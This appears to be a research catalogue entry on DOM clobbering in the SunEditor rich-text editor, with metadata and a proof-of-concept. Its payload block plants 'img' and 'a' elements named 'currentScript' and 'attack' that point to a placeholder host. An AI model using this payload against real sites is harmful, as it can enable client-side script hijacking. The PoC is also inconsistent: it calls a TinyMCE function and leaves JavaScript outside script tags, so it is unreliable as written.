## SunEditor

### Meta

+ Library: SunEditor
+ Version: v2.47.0
+ Stars: 1.7K
+ Fingerprint: `typeof window.SUNEDITOR !== undefined`
+ Input: Type
+ Sanitizer: N/A
+ Capability: `a` tag with `id`
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/JiHong88/SunEditor

### PoC

```html
<!--Library-->
<link href="https://cdn.jsdelivr.net/npm/suneditor@latest/dist/css/suneditor.min.css" rel="stylesheet">
<!-- <link href="https://cdn.jsdelivr.net/npm/suneditor@latest/assets/css/suneditor.css" rel="stylesheet"> -->
<!-- <link href="https://cdn.jsdelivr.net/npm/suneditor@latest/assets/css/suneditor-contents.css" rel="stylesheet"> -->
<script src="https://cdn.jsdelivr.net/npm/suneditor@latest/dist/suneditor.min.js"></script>
<!-- languages (Basic Language: English/en) -->
<script src="https://cdn.jsdelivr.net/npm/suneditor@latest/src/lang/ko.js"></script>

<textarea id="sample">Hi</textarea>
const editor = SUNEDITOR.create((document.getElementById('sample') || 'sample'),{
    // All of the plugins are loaded in the "window.SUNEDITOR" object in dist/suneditor.min.js file
    // Insert options
    // Language global object (default: en)
    lang: SUNEDITOR_LANG['ko']
});
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Copy & Paste the following rendered HTML elements to the editor and Run the following code: tinymce.activeEditor.getContent("default");</p>
<!--Payload-->
```